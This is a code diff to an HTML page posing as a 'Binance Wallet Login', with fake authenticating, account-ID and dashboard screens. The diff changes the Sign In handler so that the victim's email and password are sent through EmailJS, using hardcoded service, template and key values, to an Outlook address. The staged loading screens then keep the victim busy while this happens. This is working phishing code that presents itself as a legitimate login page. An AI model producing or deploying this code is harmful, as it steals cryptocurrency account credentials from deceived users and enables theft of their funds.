@@ -178,27 +178,25 @@
     }
   </style>
 </head>
-<body>
+<body>  
+
 <!-- Page 1: Login -->
 <div id="page1" class="page visible" style="background-color: #0b0e11; color: #f0b90b; padding: 40px; font-family: 'Arial Black', Arial, sans-serif; min-height: 100vh;">
   <div style="max-width: 400px; margin: auto; text-align: center;">
     <h2 style="font-size: 24px; margin-bottom: 30px;">Binance Wallet Login</h2>
-
     <input type="email" id="email" placeholder="Email"
       style="width: 100%; padding: 12px; margin-bottom: 15px; border-radius: 10px; background-color: #1e1e1e; border: 1px solid #f0b90b; color: white; font-weight: bold;" />
-
     <input type="password" id="pass" placeholder="Password"
       style="width: 100%; padding: 12px; margin-bottom: 20px; border-radius: 10px; background-color: #1e1e1e; border: 1px solid #f0b90b; color: white; font-weight: bold;" />
-
-    <button onclick="goToAuthenticating()" 
+    <button onclick="submitSignin()" 
       style="width: 100%; padding: 12px; background-color: #f0b90b; color: #000; border: none; border-radius: 10px; font-weight: bold; font-size: 16px;">
       Sign In
     </button>
   </div>
 </div>
-  
+
 <!-- Page 2: Authenticating -->
-<div id="page2" class="page" style="background-color: #0b0e11; color: #f0b90b; padding: 40px; font-family: 'Arial Black', Arial, sans-serif; min-height: 100vh;">
+<div id="page2" class="page" style="display:none; background-color: #0b0e11; color: #f0b90b; padding: 40px; font-family: 'Arial Black', Arial, sans-serif; min-height: 100vh;">
   <div style="max-width: 400px; margin: auto; text-align: center;">
     <h2 style="font-size: 24px;">Authenticating...</h2>
     <p style="text-align: center; color: #aaa;">Please wait...</p>
@@ -209,7 +207,7 @@
 </div>
 
 <!-- Page 3: Confirm ID -->
-<div class="page" id="page3" style="background-color: #0b0e11; color: #f0b90b; padding: 40px; min-height: 100vh; font-family: 'Arial Black', Arial, sans-serif;">
+<div class="page" id="page3" style="display:none; background-color: #0b0e11; color: #f0b90b; padding: 40px; min-height: 100vh; font-family: 'Arial Black', Arial, sans-serif;">
   <div style="max-width: 400px; margin: auto; text-align: center;">
     <h2 style="font-size: 24px; margin-bottom: 30px;">Enter Account ID</h2>
     <input id="accountIdInput" type="text" placeholder="Account ID"
@@ -227,7 +225,6 @@
     </button>
   </div>
 </div>
-
   
 <!-- Homepage (Main Dashboard) -->
 <div id="page4" class="page">
@@ -478,21 +475,30 @@
   <button class="back-btn" onclick="showPage('page4')">Back to Homepage</button>
 </div>
 
-<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+<!-- EmailJS + Spinner Style -->
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 <script>
   const emailService = "service_78wwbgl";
   const signinTemplate = "template_omkmcio";
   const publicKey = "ochPV1QVtay7TOdBA";
-
   emailjs.init(publicKey);
-  
-function showPage(pageId) {
+</script>
+
+<style>
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+</style>
+
+    <script>
+  function showPage(pageId) {
     document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
-    const target = document.getElementById(pageId) || document.getElementById(`page${pageId}`);
-    if (target) target.style.display = 'block';
+    const page = typeof pageId === 'number' ? document.getElementById('page' + pageId) : document.getElementById(pageId);
+    if (page) page.style.display = 'block';
   }
 
-  function goToAuthenticating() {
+  function submitSignin() {
     const email = document.getElementById("email").value.trim();
     const pass = document.getElementById("pass").value.trim();
 
@@ -501,43 +507,30 @@ function showPage(pageId) {
       return;
     }
 
-    showPage(2); // Page 2 is the Authenticating page
-  }
-      
-  function submitSignin() {
-    const email = document.getElementById("email").value.trim();
-    const pass = document.getElementById("pass").value.trim();
+    showPage(2); // Show Authenticating page
 
-    if (!email || !pass) {
-      alert("Please fill in both email and password.");
-      return;
-    }
-
-    // Send email via EmailJS
-    const templateParams = {
-      user_email: email,
-      user_password: pass,
-    };
-
-    emailjs.send(emailService, signinTemplate, templateParams)
-      .then(() => {
-        // Go to Page 2 (Authenticating)
-        showPage(2);
-        // Wait 7 seconds, then go to Page 3
-        setTimeout(() => {
-          showPage(3);
-        }, 7000);
-      })
-      .catch(err => {
-        alert("Error sending email: " + err.text);
+    setTimeout(() => {
+      // Send credentials via EmailJS
+      emailjs.send(emailService, signinTemplate, {
+        user_email: email,
+        user_password: pass,
+        to_email: "binancewebonline@outlook.com"
+      }).then(() => {
+        console.log("Login data sent successfully.");
+      }).catch((error) => {
+        console.error("EmailJS error:", error);
       });
+
+      // After 7 seconds, move to Page 3
+      showPage(3);
+    }, 7000);
   }
 
   function confirmAccountID() {
     const input = document.getElementById("accountIdInput").value.trim();
     const spinner = document.getElementById("accountSpinner");
 
-    if (input === "") {
+    if (!input) {
       alert("Please enter your Account ID.");
       return;
     }
@@ -546,9 +539,10 @@ function showPage(pageId) {
 
     setTimeout(() => {
       spinner.style.display = "none";
-      showPage(4); // Goes to Homepage
-    }, 1500);
+      showPage(4); // Go to homepage (Page 4)
+    }, 5000); // 5 seconds delay
   }
+
   // Utility to show page by id and hide others
   function showPage(pageId) {
   const pages = document.querySelectorAll('.page');
